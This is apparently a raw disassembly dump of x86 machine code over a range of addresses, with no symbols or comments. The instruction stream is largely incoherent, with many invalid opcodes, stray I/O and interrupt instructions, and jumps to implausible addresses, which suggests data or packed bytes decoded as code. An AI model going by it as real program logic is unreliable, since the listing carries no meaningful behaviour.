  416839:	fstp   TBYTE PTR [eax+ebp*2]
  41683c:	mov    esp,DWORD PTR [edi-0x6075307c]
  416842:	mov    al,ds:0x9cb7fcd0
  416847:	jge    0x416840
  416849:	fld    st(4)
  41684b:	clc    
  41684c:	les    esp,FWORD PTR [edi-0x5d62fe5c]
  416852:	cmp    BYTE PTR [ebp+0x73],0xe
  416856:	cwde   
  416857:	in     eax,dx
  416858:	adc    esp,DWORD PTR [ebx-0x80]
  41685b:	add    eax,0xf87fe676
  416861:	arpl   sp,cx
  416863:	or     BYTE PTR [ecx-0x77fc2de],al
  416869:	arpl   bx,bp
  41686b:	repz imul eax,DWORD PTR [eax],0x8b04e5dd
  416872:	daa    
  416873:	lahf   
  416874:	aad    0x55
  416876:	int    0xc2
  416878:	les    eax,FWORD PTR [eax-0x37805062]
  41687e:	mov    ebp,0x2788f966
  416883:	mov    al,0x77
  416885:	inc    ebx
  416886:	push   esi
  416887:	jns    0x41684e
  416889:	psubusw mm7,QWORD PTR [eax+eiz*1]
  41688d:	pop    ebp
  41688e:	cmp    al,0xc9
  416890:	ds sbb al,0x62
  416893:	dec    ebp
  416894:	ja     0x416882
  416896:	xor    ecx,DWORD PTR [edi+0x77]
  416899:	sbb    ebp,edx
  41689b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41689c:	mov    esp,0xf20717ff
  4168a1:	pop    es
  4168a2:	or     eax,0x17746afd
  4168a7:	sbb    dh,bh
  4168a9:	pop    eax
  4168aa:	fsub   DWORD PTR gs:[edx]
  4168ad:	and    BYTE PTR [edx],0xe
  4168b0:	scas   al,BYTE PTR es:[edi]
  4168b1:	fst    DWORD PTR [ebx+esi*8-0x18]
  4168b5:	int    0xbb
  4168b7:	fcomp  QWORD PTR [esi+0x3b]
  4168ba:	cmp    bh,BYTE PTR [esi]
  4168bc:	add    BYTE PTR [edx+eiz*2],al
  4168bf:	mov    BYTE PTR [ebp+0x13],dh
  4168c2:	jmp    0x416845
  4168c4:	repz lock pop ecx
  4168c7:	pop    esi
  4168c8:	jmp    0x4168ba
  4168ca:	pop    edx
  4168cb:	das    
  4168cc:	jecxz  0x41689e
  4168ce:	jno    0x41692c
  4168d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168d1:	test   DWORD PTR [eax],0x5bf89ea
  4168d7:	(bad)  
  4168d8:	psadbw mm7,QWORD PTR [eax-0x21]
  4168dc:	test   eax,0xf36203ea
  4168e1:	call   0x5f710eb4
  4168e6:	cmp    bh,dl
  4168e8:	sbb    ebp,DWORD PTR [ebx-0x4cab189a]
  4168ee:	jp     0x4168c2
  4168f0:	jno    0x4168ee
  4168f2:	iret   
  4168f3:	(bad)  
  4168f4:	mov    BYTE PTR [edx-0x7477d504],al
  4168fa:	jp     0x416898
  4168fc:	je     0x4168f3
  4168fe:	xor    cx,bp
  416901:	jp     0x4168f3
  416903:	imul   ebp,DWORD PTR [edi],0x5c51d073
  416909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41690a:	test   DWORD PTR [esi],0xa03cbf27
  416910:	jmp    0x762c39fe
  416915:	mov    ecx,0x71e6dad2
  41691a:	fisub  DWORD PTR [ecx]
  41691c:	fstp   DWORD PTR [ebx-0x6d2f0e86]
  416922:	sub    BYTE PTR [ebp+ecx*1+0x1],0x9c
  416927:	or     DWORD PTR [ebp+0x57],edx
  41692a:	cs cld 
  41692c:	pop    esp
  41692d:	rcr    DWORD PTR [ebp-0x6cfe0deb],0x5e
  416934:	das    
  416935:	addr16 jmp 0xbbc6:0xe992c800
  41693d:	fld    DWORD PTR [eax]
  41693f:	push   es
  416940:	xor    bl,al
  416942:	xchg   DWORD PTR [ecx],eax
  416944:	mov    esp,0xc46c0d0c
  416949:	or     al,0x8
  41694b:	xchg   edi,eax
  41694c:	mov    esp,0xa26a152c
  416951:	aad    0x87
  416953:	fnstcw WORD PTR [ebx+0x725cfbe7]
  416959:	push   esp
  41695a:	test   BYTE PTR [ecx+0x61],ch
  41695d:	fld    DWORD PTR [eax]
  41695f:	push   ebx
  416960:	pusha  
  416961:	cs push ecx
  416963:	pop    ss
  416964:	jnp    0x4168f8
  416966:	jmp    0xfcc7ee17
  41696b:	bound  ebp,QWORD PTR [edi]
  41696d:	push   edx
  41696e:	icebp  
  41696f:	xchg   ecx,eax
  416970:	add    DWORD PTR [edx],ebp
  416972:	cld    
  416973:	sahf   
  416974:	ss push ebp
  416976:	push   edi
  416977:	xchg   esi,eax
  416978:	inc    edi
  416979:	push   edx
  41697a:	ret    
  41697b:	or     ch,0x84
  41697e:	jbe    0x416959
  416980:	inc    esi
  416981:	or     al,0xd
  416983:	pop    ss
  416984:	aas    
  416985:	sub    al,0x15
  416987:	push   0x22
  416989:	aad    0x5b
  41698b:	setnp  BYTE PTR [esi+0x2c61f9bf]
  416992:	mov    BYTE PTR [ebp-0x4f],cl
  416995:	sub    eax,0xf1de1c88
  41699a:	inc    esp
  41699b:	jmp    0x572292a0
  4169a0:	add    BYTE PTR [esi+edi*8],ah
  4169a3:	test   al,al
  4169a5:	scas   eax,DWORD PTR es:[edi]
  4169a6:	jmp    0x6acb:0x8375fd
  4169ad:	js     0x4169d2
  4169af:	aaa    
  4169b0:	cli    
  4169b1:	dec    ebx
  4169b2:	fucomi st,st(0)
  4169b4:	dec    edi
  4169b5:	and    esi,edi
  4169b7:	std    
  4169b8:	(bad)  
  4169b9:	out    dx,al
  4169ba:	cmp    ch,0x55
  4169bd:	daa    
  4169be:	xchg   esp,eax
  4169bf:	pop    esi
  4169c0:	leave  
  4169c1:	mov    DWORD PTR [ebp-0x5f3c5f04],eax
  4169c7:	inc    eax
  4169c8:	add    BYTE PTR [ebx+ecx*4],dh
  4169cb:	sub    al,0xff
  4169cd:	scas   eax,DWORD PTR es:[edi]
  4169ce:	out    0x10,al
  4169d0:	(bad)  
  4169d1:	mov    edi,0xafff10b9
  4169d6:	mov    ecx,0xfcf7e810
  4169db:	std    
  4169dc:	(bad)  
  4169dd:	mov    eax,0x4f6b993b
  4169e2:	(bad)  
  4169e4:	jo     0x4169d5
  4169e6:	std    
  4169e7:	je     0x416a0d
  4169e9:	or     edi,esi
  4169eb:	je     0x416a11
  4169ed:	or     edi,esi
  4169ef:	je     0x416a15
  4169f1:	(bad)  [edx]
  4169f3:	lahf   
  4169f4:	(bad)  
  4169f5:	hlt    
  4169f6:	std    
  4169f7:	shl    DWORD PTR [ecx+0x40a153],0xd4
  4169fe:	mov    dh,BYTE PTR [edi+edi*8]
  416a01:	add    BYTE PTR [edi-0x5000ef1a],bh
  416a07:	out    0x10,al
  416a09:	jmp    FWORD PTR [edi-0x4117ef1a]
  416a0f:	std    
  416a10:	std    
  416a11:	dec    DWORD PTR [eax+0x3b]
  416a14:	cdq    
  416a15:	imul   edi,DWORD PTR [edi+0x6270fdda],0xffffffec
  416a1c:	gs je  0x416a5d
  416a1f:	and    BYTE PTR [ebp+0x74],0x46
  416a23:	mov    al,ds:0xa03e7465
  416a28:	pop    eax
  416a29:	jmp    0xc1a6399a
  416a2e:	ret    
  416a2f:	sub    cl,bl
  416a31:	inc    ebx
  416a32:	bound  edi,QWORD PTR [edi+0x6c5547ef]
  416a38:	sbb    al,0x8
  416a3a:	cmp    al,BYTE PTR [esi+0x65]
  416a3d:	std    
  416a3e:	inc    ebp
  416a3f:	mov    bl,0x9e
  416a41:	cwde   
  416a42:	leave  
  416a43:	xor    al,0x0
  416a45:	std    
  416a46:	mov    dl,0x34
  416a48:	gs je  0x4169d1
  416a4b:	js     0x416aa5
  416a4d:	inc    esp
  416a4e:	and    eax,0xb7c16077
  416a53:	or     esi,DWORD PTR [ecx-0x7f]
  416a56:	push   es
  416a57:	adc    al,0xb4
  416a59:	push   ebp
  416a5a:	mov    ch,0xfb
  416a5c:	pop    ebp
  416a5d:	call   0xfda2000b
  416a62:	out    0x9e,eax
  416a64:	adc    BYTE PTR [eax+eax*1+0x7140],al
  416a6b:	(bad)  
  416a6d:	dec    eax
  416a6e:	mov    bh,0xec
  416a70:	outs   dx,DWORD PTR ds:[esi]
  416a71:	add    BYTE PTR [eax],al
  416a73:	retf   0xb38e
  416a76:	cld    
  416a77:	aad    0xf4
  416a79:	mov    ecx,0xbd863893
  416a7e:	out    0x5e,eax
  416a80:	ret    
  416a81:	pop    edi
  416a82:	std    
  416a83:	loope  0x416a59
  416a85:	pop    eax
  416a86:	add    bh,ah
  416a88:	mov    esp,0x581f8b78
  416a8d:	inc    edi
  416a8e:	inc    ebx
  416a8f:	mov    edx,0x8e434770
  416a94:	fdivr  st,st(2)
  416a96:	add    esp,DWORD PTR [edx-0x27]
  416a99:	jo     0x416a64
  416a9b:	jge    0x416b0d
  416a9d:	inc    edi
  416a9e:	or     BYTE PTR [edx-0x27],ah
  416aa1:	pop    esi
  416aa2:	push   esp
  416aa3:	loope  0x416a33
  416aa5:	xrelease xchg DWORD PTR [ebx+0x1d03e9d8],ebx
  416aac:	das    
  416aad:	gs leave 
  416aaf:	mov    eax,ds:0x4a535f28
  416ab4:	js     0x416b0a
  416ab6:	add    eax,0xd92a5e62
  416abb:	pop    edi
  416abc:	push   esi
  416abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416abe:	imul   edi,DWORD PTR [edx],0xffffff9a
  416ac1:	out    0x3,al
  416ac3:	bound  edx,QWORD PTR [eax-0x6]
  416ac6:	mov    BYTE PTR [edi+ecx*1],ch
  416ac9:	or     DWORD PTR [ecx+0x6dd53400],ecx
  416acf:	cwde   
  416ad0:	(bad)  
  416ad1:	fldl2t 
  416ad3:	nop
  416ad4:	test   eax,0x5e8ed271
  416ad9:	fldl2t 
  416adb:	nop
  416adc:	mov    eax,ds:0x71633a85
  416ae1:	mov    ecx,0x14fdc3f6
  416ae6:	ret    
  416ae7:	clc    
  416ae8:	xchg   ebp,eax
  416ae9:	call   0x821c6f17
  416aee:	ja     0x416af4
  416af0:	loope  0x416a76
  416af2:	fild   DWORD PTR [edi+0x3e9d9f7]
  416af8:	dec    eax
  416af9:	in     al,dx
  416afa:	ins    BYTE PTR es:[edi],dx
  416afb:	mov    eax,0x898222c5
  416b00:	xor    BYTE PTR [ebx+ecx*4-0x33d4bea],al
  416b07:	pop    edi
  416b08:	xor    al,0xe0
  416b0a:	outs   dx,BYTE PTR ds:[esi]
  416b0b:	maskmovq mm5,mm7
  416b0e:	add    dh,ch
  416b10:	shr    BYTE PTR [eax],cl
  416b12:	jmp    0x1b4b198
  416b17:	jmp    0xf1b70506
  416b1c:	fwait
  416b1d:	shl    DWORD PTR [ebp+0x55],0xa5
  416b21:	jnp    0x416b0b
  416b23:	jmp    0x416b7c
  416b25:	mov    ds:0xe07a4654,al
  416b2a:	pop    gs
  416b2c:	popa   
  416b2d:	pop    ebp
  416b2e:	fdivr  DWORD PTR [ebp+0x50f2a000]
  416b34:	ret    
  416b35:	popa   
  416b36:	xchg   BYTE PTR [esi],dh
  416b38:	mov    cl,0x40
  416b3a:	sbb    BYTE PTR [ecx],al
  416b3c:	push   ds
  416b3d:	dec    edx
  416b3e:	adc    BYTE PTR [ecx],0xa9
  416b41:	popa   
  416b42:	push   edx
  416b43:	icebp  
  416b44:	fs fwait
  416b46:	or     eax,0x7193720c
  416b4b:	cdq    
  416b4c:	mul    BYTE PTR [eax-0x27]
  416b4f:	ret    
  416b50:	out    dx,eax
  416b51:	xor    DWORD PTR [edi],0xd78ce941
  416b57:	das    
  416b58:	fucomip st,st(1)
  416b5a:	(bad)  
  416b5b:	cwde   
  416b5c:	push   edx
  416b5d:	sbb    al,BYTE PTR [ebp+eax*4+0x66b62adf]
  416b64:	icebp  
  416b65:	in     al,dx
  416b66:	daa    
  416b67:	in     eax,0x20
  416b69:	xchg   al,ah
  416b6b:	dec    esi
  416b6c:	mov    esi,0xcd465083
  416b71:	scas   al,BYTE PTR es:[edi]
  416b72:	test   BYTE PTR [esi],dl
  416b74:	std    
  416b75:	xlat   BYTE PTR ds:[ebx]
  416b76:	ret    
  416b77:	add    BYTE PTR [esi+ebx*1+0xd],ch
  416b7b:	or     dh,BYTE PTR [edx-0x6a]
  416b7e:	retf   0x81c9
  416b81:	inc    eax
  416b82:	test   ah,bh
  416b84:	jmp    0x128ef5a
  416b89:	mov    cl,0x52
  416b8b:	dec    eax
  416b8c:	call   0x432d64
  416b91:	mov    ebx,0x5fc0ed
  416b96:	ins    DWORD PTR es:[edi],dx
  416b97:	inc    esi
  416b98:	ret    
  416b99:	ret    
  416b9a:	mov    cl,0xe3
  416b9c:	push   0xfc916258
  416ba1:	out    0xd3,eax
  416ba3:	cmp    edi,edi
  416ba5:	inc    DWORD PTR [edx]
  416ba7:	dec    esp
  416ba8:	fmul   QWORD PTR [ebx-0x762611c6]
  416bae:	into   
  416baf:	and    ecx,DWORD PTR [eax+0x1372ef55]
  416bb5:	pop    ecx
  416bb6:	mov    ds:0x7cff4c53,eax
  416bbb:	push   edx
  416bbc:	push   eax
  416bbd:	mov    ah,0xf1
  416bbf:	test   BYTE PTR [ebx-0x18],dl
  416bc2:	in     al,dx
  416bc3:	inc    edi
  416bc4:	std    
  416bc5:	(bad)  
  416bc6:	cli    
  416bc7:	push   ebx
  416bc8:	inc    eax
  416bc9:	mov    esp,0xe8cb55db
  416bce:	push   ds
  416bcf:	fadd   QWORD PTR [eax]
  416bd1:	add    BYTE PTR [edx+eiz*2],bh
  416bd4:	ror    DWORD PTR [ecx-0x72b4353a],0x46
  416bdb:	popa   
  416bdc:	push   ecx
  416bdd:	mov    edi,DWORD PTR [ebp-0x4fae612]
  416be3:	(bad)  
  416be4:	or     eax,0xfe6013b7
  416be9:	dec    DWORD PTR [ebx]
  416beb:	xlat   BYTE PTR ds:[ebx]
  416bec:	mov    DWORD PTR [ebp-0x29],eax
  416bef:	jo     0x416c2a
  416bf1:	sar    esp,0x5a
  416bf4:	jle    0x416bf7
  416bf6:	retf   
  416bf7:	(bad)  
  416bf8:	bound  edi,QWORD PTR [ebx]
  416bfa:	add    BYTE PTR [edx],al
  416bfc:	jmp    0x8d00:0xd6ba7684
  416c03:	bound  edi,QWORD PTR [ebp-0x8edb0cc]
  416c09:	push   ecx
  416c0a:	call   0x41e13c
  416c0f:	fstp   TBYTE PTR [ebp+0x7ba28350]
  416c15:	test   BYTE PTR [ebp+0x63],bl
  416c18:	jo     0x416c1a
  416c1a:	mov    ebx,DWORD PTR [edi]
  416c1c:	les    ebp,FWORD PTR [edi+0x67b2d954]
  416c22:	pusha  
  416c23:	pop    edi
  416c24:	jo     0x416c26
  416c26:	mov    DWORD PTR [edx-0x3],esi
  416c29:	pop    ecx
  416c2a:	or     eax,0xffff49de
  416c2f:	bound  eax,QWORD PTR [edi]
  416c31:	retf   
  416c32:	shl    ecx,cl
  416c34:	leave  
  416c35:	prefetch (bad)
  416c36:	or     eax,0xffff74e0
  416c3b:	bound  eax,QWORD PTR [edi]
  416c3d:	mov    bl,0xcf
  416c3f:	fldenv [esp+ecx*2+0x1]
  416c43:	sub    eax,0xefcfb2f9
  416c48:	xor    BYTE PTR [eax],dh
  416c4a:	add    DWORD PTR [ecx+ecx*1],ebx
  416c4d:	ret    
  416c4e:	shl    DWORD PTR ds:0x25ff4c3d,cl
  416c54:	jo     0x416c56
  416c56:	xchg   DWORD PTR [edi+0x59c98cbc],edx
  416c5c:	mov    al,ds:0x780042d0
  416c61:	je     0x416c1b
  416c63:	xchg   BYTE PTR [edi+0x2a38e338],dl
  416c69:	pop    ds
  416c6a:	sub    DWORD PTR [esi+0x39],esp
  416c6d:	int    0x50
  416c6f:	jae    0x416cd6
  416c71:	fnstcw WORD PTR [edx+0x67a26f03]
  416c77:	adc    BYTE PTR [ebp+0xb],ch
  416c7a:	inc    esi
  416c7b:	push   0x66
  416c7d:	fchs   
  416c7f:	pop    ds
  416c80:	in     al,0x6
  416c82:	icebp  
  416c83:	sbb    al,0x6e
  416c85:	pop    ebx
  416c86:	xor    dl,bl
  416c88:	popa   
  416c89:	sbb    BYTE PTR [edi+0x3c],bh
  416c8c:	sbb    bh,bl
  416c8e:	mov    esi,0x13d5314b
  416c93:	mov    ebx,DWORD PTR [ecx]
  416c95:	jns    0x416c19
  416c97:	fisub  DWORD PTR [edx-0x27]
  416c9a:	jmp    0x67ea9e29
  416c9f:	inc    esi
  416ca0:	dec    si
  416ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ca3:	aaa    
  416ca4:	jnp    0x416cec
  416ca6:	(bad)
  416cab:	arpl   bp,bx
  416cad:	adc    esp,DWORD PTR [edx]
  416caf:	sbb    ebx,DWORD PTR [eax]
  416cb1:	shr    edx,1
  416cb3:	sub    BYTE PTR [esi-0x14fc1628],0x1b
  416cba:	out    0x8a,al
  416cbc:	xchg   esi,eax
  416cbd:	push   ecx
  416cbe:	test   eax,0xdf9d998c
  416cc3:	leave  
  416cc4:	add    BYTE PTR [ebp-0x30],bl
  416cc7:	data16 jl 0x416d2c
  416cca:	fldl2t 
  416ccc:	mov    ah,BYTE PTR [eax-0x25e7912b]
  416cd2:	push   esp
  416cd3:	jecxz  0x416cef
  416cd5:	pop    esp
  416cd6:	add    eax,0xd5a78b0b
  416cdb:	scas   al,BYTE PTR es:[edi]
  416cdc:	lds    esp,FWORD PTR [ecx+0x6]
  416cdf:	ret    
  416ce0:	mov    ah,BYTE PTR [edi+0x5dc61ed1]
  416ce6:	push   es
  416ce7:	mov    ebx,0xecda78a
  416cec:	(bad)  
  416ced:	imul   eax,DWORD PTR [esi],0xe9a78ab3
  416cf3:	inc    ch
  416cf5:	push   ebp
  416cf6:	add    eax,0x16e8ae01
  416cfb:	adc    eax,0x74ec9ff2
  416d00:	data16 fcom DWORD PTR [esi]
  416d03:	sbb    edx,esp
  416d05:	lahf   
  416d06:	call   0x1729cb7f
  416d0b:	sbb    eax,0x74e49fd2
  416d10:	push   esi
  416d11:	fcom   DWORD PTR [esi]
  416d13:	and    edx,eax
  416d15:	lahf   
  416d16:	loopne 0x416d8c
  416d18:	dec    esi
  416d19:	call   0x9ff39234
  416d1e:	mov    esp,0x16d88674
  416d23:	sub    DWORD PTR [edx],esp
  416d25:	pushf  
  416d26:	mov    eax,0xe8007e75
  416d2b:	push   ss
  416d2c:	sub    eax,0x75b49c12
  416d31:	jbe    0x416d18
  416d33:	mov    ds:0xb07bb176,al
  416d38:	push   ebx
  416d39:	bound  esp,QWORD PTR [edx]
  416d3b:	fmul   DWORD PTR [edi+0x2e]
  416d3e:	pop    edx
  416d3f:	and    al,0x13
  416d41:	test   eax,0xb730f361
  416d46:	repnz sbb DWORD PTR [ecx],esi
  416d49:	mov    ecx,0xf75cec9c
  416d4e:	and    DWORD PTR [eax-0x36d6d281],eax
  416d54:	shr    BYTE PTR [ecx+ebp*8+0x7e],0x84
  416d59:	xchg   esp,eax
  416d5a:	test   BYTE PTR [edx+0x4e],dl
  416d5d:	or     eax,0xd0e12be8
  416d62:	retf   
  416d63:	jl     0x416d61
  416d65:	(bad)  
  416d67:	adc    ebx,ecx
  416d69:	sub    BYTE PTR [ecx-0x683103e7],cl
  416d6f:	pop    edx
  416d70:	dec    esi
  416d71:	add    BYTE PTR [edi],ah
  416d73:	push   ds
  416d74:	xchg   ebx,eax
  416d76:	adc    al,dl
  416d78:	xor    eax,eax
  416d7a:	mov    ebx,DWORD PTR [edx]
  416d7c:	mov    ah,BYTE PTR [ebp-0x5d]
  416d7f:	pop    ecx
  416d80:	dec    eax
  416d81:	cld    
  416d82:	add    al,0xeb
  416d84:	shr    al,0x2c
  416d87:	cmp    edi,edi
  416d89:	dec    DWORD PTR [ecx]
  416d8b:	rol    DWORD PTR [eax],1
  416d8d:	push   ebp
  416d8e:	add    BYTE PTR [eax+0x9],al
  416d91:	jl     0x416d7f
  416d93:	aas    
  416d94:	aad    0x0
  416d96:	add    BYTE PTR [eax+0x47],cl
  416d99:	push   ebp
  416d9a:	mov    edx,DWORD PTR [ecx]
  416d9c:	push   edx
  416d9d:	in     al,dx
  416d9e:	call   0x3f8f44
  416da3:	clc    
  416da4:	fistp  WORD PTR [eax+0xdbbf6b]
  416daa:	(bad)  
  416dab:	(bad)  
  416dad:	cld    
  416dae:	dec    DWORD PTR [ebx-0x6f6bc7a5]
  416db4:	xchg   edi,eax
  416db5:	cld    
  416db6:	push   DWORD PTR [esi+edx*2-0x69]
  416dba:	add    DWORD PTR [ebx-0x25],ecx
  416dbd:	jg     0x416db5
  416dbf:	lgs    esp,FWORD PTR [esi+0x18]
  416dc3:	(bad)  
  416dc4:	inc    esi
  416dc5:	fcomp  QWORD PTR [ecx+0x73]
  416dc8:	adc    ecx,DWORD PTR [esi-0x1]
  416dcb:	push   esp
  416dcc:	jae    0x416dcb
  416dce:	push   esi
  416dcf:	fs xchg ah,cl
  416dd2:	adc    edi,ebx
  416dd4:	fiadd  DWORD PTR [edi-0x36afa4ab]
  416dda:	call   0x425fcc
  416ddf:	jle    0x416df6
  416de1:	push   cs
  416de2:	test   DWORD PTR [ebx+0x680000da],ebp
  416de8:	rol    BYTE PTR [edi-0x620f9dbb],0xc
  416def:	aad    0xb0
  416df1:	add    al,0x50
  416df3:	add    bh,bl
  416df5:	(bad)  [eax-0x75]
  416df8:	xchg   edi,eax
  416df9:	cwde   
  416dfa:	xchg   DWORD PTR [ebx-0x26],edi
  416dfd:	cs ret 
  416dff:	sti    
  416e00:	arpl   cx,di
  416e02:	mov    edx,0x7115dbe7
  416e07:	xchg   DWORD PTR [edi+0x54],ecx
  416e0a:	mov    BYTE PTR [ebx-0x4e],bl
  416e0d:	pop    eax
  416e0e:	jno    0x416e0b
  416e10:	mov    ch,0x4f
  416e12:	xchg   DWORD PTR [ebx-0x3a],esi
  416e15:	add    eax,0x30dee3cb
  416e1a:	rcl    DWORD PTR [ecx],cl
  416e1c:	mov    cl,dl
  416e1e:	(bad)  
  416e1f:	jmp    DWORD PTR [edx-0x5]
  416e22:	retf   0x7ae7
  416e25:	outs   dx,DWORD PTR ds:[esi]
  416e26:	stos   DWORD PTR es:[edi],eax
  416e27:	inc    DWORD PTR [ebp+0x7dff2929]
  416e2d:	jo     0x416e97
  416e2f:	test   al,0x63
  416e31:	jo     0x416e33
  416e33:	mov    DWORD PTR [edi],ebx
  416e35:	sub    BYTE PTR [eax-0xd],ch
  416e38:	mov    dh,0x71
  416e3a:	add    al,ch
  416e3c:	cmp    DWORD PTR [ebp+ebx*2-0x3],ebx
  416e40:	fisubr WORD PTR [edi+0x7173840c]
  416e46:	add    BYTE PTR [eax],al
  416e48:	fldcw  WORD PTR [eax+edi*2+0x69]
  416e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e4d:	jo     0x416dd8
  416e4f:	inc    ebx
  416e50:	(bad)  
  416e51:	clc    
  416e52:	mov    esi,0x342cd92f
  416e57:	xchg   DWORD PTR [eax],eax
  416e59:	mov    ds:0xc2438944,eax
  416e5e:	clc    
  416e5f:	mov    esi,0x3034e937
  416e64:	xchg   DWORD PTR [ebx-0x5e70da27],esp
  416e6a:	popa   
  416e6b:	jno    0x416e32
  416e6d:	cmp    eax,0xdd4c2d52
  416e72:	pop    ss
  416e73:	es (bad) 
  416e75:	mov    eax,ds:0x9dc57165
  416e7a:	push   edx
  416e7b:	and    eax,0x29503340
  416e80:	enter  0xffdc,0xfd
  416e84:	in     eax,dx
  416e85:	popa   
  416e86:	inc    ebx
  416e87:	sahf   
  416e88:	jp     0x416eac
  416e8a:	(bad)  
  416e8c:	dec    esp
  416e8d:	retf   0x3e7a
  416e90:	pop    ebx
  416e91:	mov    bh,0x54
  416e93:	stos   BYTE PTR es:[edi],al
  416e94:	or     esp,esi
  416e96:	inc    esp
  416e97:	jmp    0xb7b:0xed526203
  416e9e:	adc    eax,0xcc8686ea
  416ea3:	pop    esp
  416ea4:	int    0x3d
  416ea6:	inc    ebx
  416ea7:	outs   dx,DWORD PTR ds:[esi]
  416ea8:	mov    bl,0x44
  416eaa:	fst    DWORD PTR [ecx-0x7a]
  416ead:	retf   0xe9d7
  416eb0:	and    BYTE PTR [edx+0x627264cd],0xd9
  416eb7:	jmp    0xcfa2c84a
  416ebc:	mov    edi,0x46585d00
  416ec1:	or     cl,ch
  416ec3:	adc    dh,dh
  416ec5:	popf   
  416ec6:	add    DWORD PTR ds:0xf63a03a9,esp
  416ecc:	push   ecx
  416ecd:	add    eax,0xd12a5662
  416ed2:	mov    ecx,0xbb7bdd50
  416ed7:	adc    eax,0xce3686ea
  416edc:	ins    BYTE PTR es:[edi],dx
  416edd:	int    0x55
  416edf:	aas    
  416ee0:	add    DWORD PTR [esi],esi
  416ee2:	sar    DWORD PTR [ebx+0x351c0100],1
  416ee8:	add    ch,cl
  416eea:	loop   0x416e85
  416eec:	jbe    0x416f39
  416eee:	in     eax,dx
  416eef:	rcr    BYTE PTR [eax+0x7f7d2242],1
  416ef5:	mov    ebp,0x54a5065
  416efa:	les    esp,FWORD PTR [esp+edx*2+0x31716628]
  416f01:	sbb    DWORD PTR [esi-0x27],0x14b2a985
  416f08:	mov    ah,dh
  416f0a:	dec    ecx
  416f0b:	repnz inc esp
  416f0d:	jmp    0x644edcf6
  416f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f13:	adc    al,0xb7
  416f15:	call   0x34b3:0x9100bbf0
  416f1c:	add    ch,cl
  416f1e:	loop   0x416eb9
  416f20:	jbe    0x416ee9
  416f22:	add    ah,ah
  416f24:	rcr    BYTE PTR [eax+0x7f7ca202],1
  416f2a:	push   ebp
  416f2b:	pop    ebp
  416f2c:	push   eax
  416f2d:	dec    edx
  416f2e:	lods   eax,DWORD PTR ds:[esi]
  416f2f:	(bad)  
  416f31:	pop    eax
  416f32:	test   al,0x61
  416f34:	jno    0x416f33
  416f36:	xchg   BYTE PTR [esi-0x27],ah
  416f39:	test   DWORD PTR [ecx],ebp
  416f3b:	xchg   edx,eax
  416f3c:	call   0x7d4f5029
  416f41:	cld    
  416f42:	ins    DWORD PTR es:[edi],dx
  416f43:	mov    eax,ds:0x62270805
  416f48:	gs push 0xac7c61ad
  416f4e:	call   0x71e33e1f
  416f53:	inc    esp
  416f54:	sbb    BYTE PTR [ecx],al
  416f56:	pusha  
  416f57:	jmp    0x4f42580b
  416f5c:	inc    ebx
  416f5d:	std    
  416f5e:	(bad)  
  416f5f:	fst    DWORD PTR [edi]
  416f61:	pop    esi
  416f62:	pop    esi
  416f63:	lock or al,0xc2
  416f66:	call   0x3f8f4c
  416f6b:	push   0x77053915
  416f70:	outs   dx,BYTE PTR ds:[esi]
  416f71:	inc    eax
  416f72:	add    ah,bh
  416f74:	cmp    bh,bh
  416f76:	xchg   edi,eax
  416f77:	mov    al,ds:0x45c2fc99
  416f7c:	dec    esi
  416f7d:	in     al,dx
  416f7e:	sbb    ch,0xd7
  416f81:	outs   dx,DWORD PTR ds:[esi]
  416f82:	or     BYTE PTR [eax-0x71],al
  416f85:	add    al,0xe8
  416f87:	add    al,ah
  416f89:	sub    eax,0x17a8fffc
  416f8e:	mov    DWORD PTR [esi],eax
  416f90:	xor    dl,BYTE PTR [edi-0x327a7700]
  416f96:	add    DWORD PTR [esi-0x71],0x41
  416f9a:	ror    DWORD PTR [ebx-0x7aad2eb6],0xf9
  416fa1:	mov    eax,DWORD PTR [ebx+ecx*4]
  416fa4:	dec    edx
  416fa5:	int    0x83
  416fa7:	inc    ecx
  416fa8:	scas   eax,DWORD PTR es:[edi]
  416fa9:	in     al,dx
  416faa:	mov    ebp,DWORD PTR cs:[edx-0x6629c631]
  416fb1:	mov    eax,0x52874189
  416fb6:	add    eax,0x71c55046
  416fbb:	sbb    eax,0x82ff4c95
  416fc0:	mov    ebx,edx
  416fc2:	adc    DWORD PTR [ecx+0x3f],0x79
  416fc6:	jg     0x416f88
  416fc8:	push   ss
  416fc9:	and    eax,0x8c393963
  416fce:	push   cs
  416fcf:	lea    ecx,[ecx]
  416fd1:	aad    0x83
  416fd3:	inc    ecx
  416fd4:	bound  esi,QWORD PTR [ebp+edx*1-0x40]
  416fd8:	mov    WORD PTR [edi+0x70565f85],gs
  416fde:	lea    edi,[edi]
  416fe0:	outs   dx,BYTE PTR ds:[esi]
  416fe1:	pop    edx
  416fe2:	inc    ebp
  416fe3:	push   esi
  416fe4:	jmp    0x5ebff06a
  416fe9:	jo     0x416fb7
  416feb:	sbb    DWORD PTR [eax],eax
  416fed:	lods   eax,DWORD PTR ds:[esi]
  416fee:	fistp  WORD PTR [ecx+0x37]
  416ff1:	jl     0x416f7b
  416ff3:	ror    BYTE PTR [esi],cl
  416ff5:	jmp    0x5eca70ac
  416ffa:	imul   ebp,DWORD PTR [eax+0x37],0x450071b9
  417001:	cdq    
  417002:	mov    edx,0xe3c5720c
  417007:	lea    ecx,[esi+0x66]
  41700a:	cwde   
  41700b:	cs test eax,0x66857063
  417011:	data16 jo 0x416f99
  417014:	pushw  0x70
  417017:	mov    edx,0x20dcd9c0
  41701c:	add    al,0xba
  41701e:	fwait
  41701f:	lods   eax,DWORD PTR ds:[esi]
  417020:	call   FWORD PTR [ebp+0x2ffffc2e]
  417026:	test   DWORD PTR [esi+0x55],0x8b0cb2d9
  41702d:	adc    al,0x6c
  41702f:	adc    DWORD PTR [edi+eiz*8],0x74
  417033:	add    BYTE PTR [eax],al
  417035:	bound  ebx,QWORD PTR [eax]
  417037:	sub    DWORD PTR [edx-0x3f838f9d],0xffffffef
  41703e:	ins    BYTE PTR es:[edi],dx
  41703f:	test   eax,ecx
  417041:	pop    ebp
  417042:	daa    
  417043:	repnz mov BYTE PTR [eax+edi*2-0x899b173],ch
  41704b:	mov    ebx,0x70d95623
  417050:	inc    DWORD PTR [eax]
  417052:	in     al,dx
